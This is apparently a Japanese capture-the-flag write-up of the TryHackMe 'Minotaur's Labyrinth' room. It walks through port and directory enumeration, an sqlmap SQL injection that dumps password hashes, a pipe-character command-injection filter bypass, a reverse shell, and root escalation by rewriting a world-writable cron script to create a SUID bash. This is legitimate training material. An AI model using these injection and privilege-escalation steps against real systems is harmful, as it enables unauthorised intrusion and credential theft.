# Minotaur's Labyrinth CTF

https://tryhackme.com/room/labyrinth8llv

## Enumeration

```shell
TARGET=10.201.61.159
sudo bash -c "echo $TARGET   mino.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
```

```sh
sudo nmap -sS -sV -p21,22,80,443,3306 $TARGET

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
3306/tcp open  mysql?
```

FTP,SSH,HTTP,HTTPS,MySQL(?)

HTTPSの証明書情報を見ると、mino.thm で正しかった模様。

```sh
root@ip-10-201-108-160:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.61.159
+ Target Hostname:    mino.thm
+ Target Port:        80
+ Start Time:         2025-11-10 06:30:55 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/8.0.7
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: login.html
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /imgs/: Directory indexing found.
+ OSVDB-3092: /imgs/: This might be interesting...
+ OSVDB-3268: /logs/: Directory indexing found.
+ OSVDB-3092: /logs/: This might be interesting...
+ Server leaks inodes via ETags, header found with file /login.html, fields: 0x9b5 0x5c532012bd966 
+ /login.html: Admin login page/section found.
+ /login.php: Admin login page/section found.
+ 1707 items checked: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-11-10 06:31:05 (GMT0) (10 seconds)
---------------------------------------------------------------------------
```

/logs は興味深い。

### FTP

FTPで3ファイル入手。flag1。

```sh
$ ls    
flag.txt  keep_in_mind.txt  message.txt
```

```sh
cat keep_in_mind.txt 
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

```sh
cat ./message.txt              
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
```

全てが終わってから意味が分かるタイプのヒント。

### サブドメイン、VHOST

何も出なかった。

```shell
ffuf -u http://mino.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.mino.thm' -fs 0
```

### /logs

```http
POST /minotaur/minotaur-box/login.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 36
sec-ch-ua: "Chromium";v="93", " Not;A Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/minotaur/minotaur-box/login.html
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv
Connection: close

email=Daedalus&password=[REDACTED]
```

これを使ってログイン画面でログインできた。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://mino.thm/ ----
==> DIRECTORY: http://mino.thm/api/                                                                                  
+ http://mino.thm/cgi-bin/ (CODE:403|SIZE:1030)                                                                      
==> DIRECTORY: http://mino.thm/css/                                                                                  
==> DIRECTORY: http://mino.thm/imgs/                                                                                 
==> DIRECTORY: http://mino.thm/js/                                                                                   
==> DIRECTORY: http://mino.thm/logs/                                                                                 
+ http://mino.thm/phpmyadmin (CODE:403|SIZE:1185)                                                                    
                                                                                                                     
---- Entering directory: http://mino.thm/api/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://mino.thm/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://mino.thm/imgs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://mino.thm/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://mino.thm/logs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

/api の下に /api/creatures, /api/people があり、それぞれに5つのPHPがある。

```
[   ]	create.php	2021-06-20 14:50	1.9K	 
[   ]	delete.php	2021-06-20 14:50	895	 
[   ]	read.php	2021-06-20 14:50	564	 
[   ]	search.php	2021-06-20 14:50	613	 
[   ]	update.php	2021-06-20 14:50	1.1K	 
```

## SQLi

ログイン後、検索リクエストでSQLインジェクションの脆弱性を発見した。

```sh
$ sqlmap -r ./search.txt --dbs --batch

available databases [6]:
[*] information_schema
[*] labyrinth
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

テーブル

```
[2 tables]
+-----------+
| creatures |
| people    |
+-----------+
```

```
Table: creatures
[4 columns]
+--------------------+--------------+
| Column             | Type         |
+--------------------+--------------+
| idCreature         | int(11)      |
| nameCreature       | varchar(255) |
| passwordCreature   | varchar(255) |
| permissionCreature | varchar(255) |
+--------------------+--------------+

Table: people
[4 columns]
+------------------+--------------+
| Column           | Type         |
+------------------+--------------+
| idPeople         | int(11)      |
| namePeople       | varchar(255) |
| passwordPeople   | varchar(255) |
| permissionPeople | varchar(255) |
+------------------+--------------+
```

```
Table: creatures
[4 entries]
+------------+--------------+----------------------------------+--------------------+
| idCreature | nameCreature | passwordCreature                 | permissionCreature |
+------------+--------------+----------------------------------+--------------------+
| 1          | Cerberos     | 3898e56bf6fa6ddfc3c0977c514a65a8 | user               |
| 2          | Pegasus      | 5d20441c392b68c61592b2159990abfe | user               |
| 3          | Chiron       | f847149233ae29ec0e1fcf052930c044 | user               |
| 4          | Centaurus    | ea5540126c33fe653bf56e7a686b1770 | user               |
+------------+--------------+----------------------------------+--------------------+

Table: people
[5 entries]
+----------+--------------+----------------------------------+------------------+
| idPeople | namePeople   | passwordPeople                   | permissionPeople |
+----------+--------------+----------------------------------+------------------+
| 1        | Eurycliedes  | 42354020b68c7ed28dcdeabd5a2baf8e | user             |
| 2        | Menekrates   | 0b3bebe266a81fbfaa79db1604c4e67f | user             |
| 3        | Philostratos | b83f966a6f5a9cff9c6e1c52b0aa635b | user             |
| 4        | Daedalus     | b8e4c23686a3a12476ad7779e35f5eb6 | user             |
| 5        | M!n0taur     | [REDACTED] | admin            |
+----------+--------------+----------------------------------+------------------+
```

管理者ユーザーは M!n0taur で、crackstation でハッシュをクラック可能。  
ログインしたら、フラグ２が表示された。

また、分かるようでよく分からないヒント。

```html
<!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
```

## secret stuff

`abc;id` と入力したら、`You really think this is gonna be possible i fixed this @Deadalus -_- !!!?` と表示された。以前はコマンドインジェクションの脆弱性があったが修正されたと受け取れる。

`abc|id` でコマンドインジェクション成功した。

```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

busybox のリバースシェルを実行。

```sh
$ nc -lnvp 8888   
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.121.80] 59326
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## 権限昇格

/home/user にフラグ３。

```sh
daemon@ip-10-201-121-80:/opt/lampp/htdocs$ ls -al /home
total 28
drwxr-xr-x  7 root     root     4096 nov   10 07:43 .
drwxr-xr-x 26 root     root     4096 nov   10 07:43 ..
drwxr-xr-x  2 anonftp  anonftp  4096 jún   18  2021 anonftp
drwxr-xr-x 18 minotaur minotaur 4096 nov    9  2021 minotaur
drwxr-xr-x  2 ssm-user ssm-user 4096 jún   29 17:19 ssm-user
drwxr-xr-x  3 ubuntu   ubuntu   4096 nov   10 07:43 ubuntu
drwxr-xr-x  2 daemon   daemon   4096 jún   15  2021 user
```

minotaur のホーム。

```sh
daemon@ip-10-201-121-80:/home/minotaur$ ls -al
total 104
drwxr-xr-x 18 minotaur minotaur  4096 nov    9  2021 .
drwxr-xr-x  7 root     root      4096 nov   10 07:43 ..
lrwxrwxrwx  1 root     root         9 szept 13  2021 .bash_history -> /dev/null
-rw-r--r--  1 minotaur minotaur   220 jún   15  2021 .bash_logout
-rw-r--r--  1 minotaur minotaur  3771 jún   15  2021 .bashrc
drwx------ 16 minotaur minotaur  4096 szept 13  2021 .cache
drwx------ 14 minotaur minotaur  4096 nov    9  2021 .config
drwx------  3 root     root      4096 szept 13  2021 .dbus
drwxr-xr-x  2 minotaur minotaur  4096 jún   15  2021 Desktop
drwxr-xr-x  2 minotaur minotaur  4096 jún   15  2021 Documents
drwxr-xr-x  2 minotaur minotaur  4096 jún   18  2021 Downloads
drwx------  3 minotaur minotaur  4096 jún   15  2021 .gnupg
drwx------  2 root     root      4096 szept 13  2021 .gvfs
-rw-------  1 minotaur minotaur 10230 nov    9  2021 .ICEauthority
-rw-------  1 minotaur minotaur    36 okt   26  2021 .lesshst
drwx------  3 minotaur minotaur  4096 jún   15  2021 .local
drwx------  5 minotaur minotaur  4096 jún   15  2021 .mozilla
drwxr-xr-x  2 minotaur minotaur  4096 jún   15  2021 Music
drwxr-xr-x  2 minotaur minotaur  4096 okt   26  2021 Pictures
-rw-r--r--  1 minotaur minotaur   807 jún   15  2021 .profile
drwxr-xr-x  2 minotaur minotaur  4096 jún   15  2021 Public
-rw-r--r--  1 minotaur minotaur    66 jún   15  2021 .selected_editor
drwx------  2 minotaur minotaur  4096 jún   15  2021 .ssh
-rw-r--r--  1 minotaur minotaur     0 jún   15  2021 .sudo_as_admin_successful
drwxr-xr-x  2 minotaur minotaur  4096 jún   15  2021 Templates
drwxr-xr-x  2 minotaur minotaur  4096 jún   15  2021 Videos
```

参照できるファイルはPNGだけ。

```sh
daemon@ip-10-201-121-80:/home/minotaur$ find . 2>/dev/null
.
./Music
./.cache
./.gnupg
./.profile
./.bash_logout
./.selected_editor
./.sudo_as_admin_successful
./Documents
./Templates
./Public
./.lesshst
./.mozilla
./.bashrc
./.config
./.ICEauthority
./.gvfs
./.local
./Pictures
./Pictures/Screenshot from 2021-09-13 21-46-44.png
./Pictures/Screenshot from 2021-09-13 21-20-37.png
./Pictures/Screenshot from 2021-10-26 15-41-08.png
./Pictures/Screenshot from 2021-09-22 12-46-44.png
./Videos
./.bash_history
./Downloads
./.ssh
./Desktop
./.dbus
```

4枚のPNGは、画面キャプチャだった。

/usr/bin/apt のサイズが、キャプチャ（14424）と異なる点は気になる。

```sh
daemon@ip-10-201-121-80:/opt/lampp$ ls -al /usr/bin/apt
-rwxr-xr-x 1 root root 18824 okt   22  2024 /usr/bin/apt
```

バージョン確認しようとしたら、下記エラーが出た。

```sh
daemon@ip-10-201-121-80:/opt/lampp$ /usr/bin/apt -v       
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `GLIBCXX_3.4.20' not found (required by /usr/lib/x86_64-linux-gnu/libapt-private.so.0.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `CXXABI_1.3.9' not found (required by /usr/lib/x86_64-linux-gnu/libapt-private.so.0.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `GLIBCXX_3.4.21' not found (required by /usr/lib/x86_64-linux-gnu/libapt-private.so.0.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `GLIBCXX_3.4.20' not found (required by /usr/lib/x86_64-linux-gnu/libapt-pkg.so.6.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `CXXABI_1.3.8' not found (required by /usr/lib/x86_64-linux-gnu/libapt-pkg.so.6.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `CXXABI_1.3.9' not found (required by /usr/lib/x86_64-linux-gnu/libapt-pkg.so.6.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `GLIBCXX_3.4.26' not found (required by /usr/lib/x86_64-linux-gnu/libapt-pkg.so.6.0)
/usr/bin/apt: /opt/lampp/lib/libstdc++.so.6: version `GLIBCXX_3.4.21' not found (required by /usr/lib/x86_64-linux-gnu/libapt-pkg.so.6.0)
```

しかし、apt に何かがあるとしても、daemonのままでは何もできない。

ルートディレクトリに /timers を発見。

```sh
daemon@ip-10-201-121-80:/opt/lampp/htdocs$ ls -al /timers
total 12
drwxrwxrwx  2 root root 4096 jún   15  2021 .
drwxr-xr-x 26 root root 4096 nov   10 07:43 ..
-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh

daemon@ip-10-201-121-80:/opt/lampp/htdocs$ cat /timers/timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
```

/reminders/dontforget.txt のタイムスタンプを見ると、（root権限で）頻繁に実行されていると思われる。

```sh
daemon@ip-10-201-121-80:/opt/lampp/htdocs$ ls -al /reminders/dontforget.txt
-rw-r--r-- 1 root root 44884 nov   10 09:26 /reminders/dontforget.txt
```

シンプルにシェルを変更。

```sh
echo '#!/bin/bash' > /timers/timer.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /timers/timer.sh
```

成功。

```sh
daemon@ip-10-201-121-80:/opt/lampp/htdocs$ ls -al /tmp
total 1216
drwxrwxrwt 15 root root    4096 nov   10 09:29 .
drwxr-xr-x 26 root root    4096 nov   10 07:43 ..
-rwsr-sr-x  1 root root 1183448 nov   10 09:29 bash
```

root昇格

```sh
daemon@ip-10-201-121-80:/opt/lampp/htdocs$ /tmp/bash -p
bash-5.0# id
uid=1(daemon) gid=1(daemon) euid=0(root) egid=0(root) groups=0(root),1(daemon)
```

## 振り返り

- シェルを取るまでは非常に順調だったが、apt でかなりの時間を無駄にして timers ディレクトリの発見が遅れた。
- 列挙でルートディレクトリを確認するのは大切と痛感。
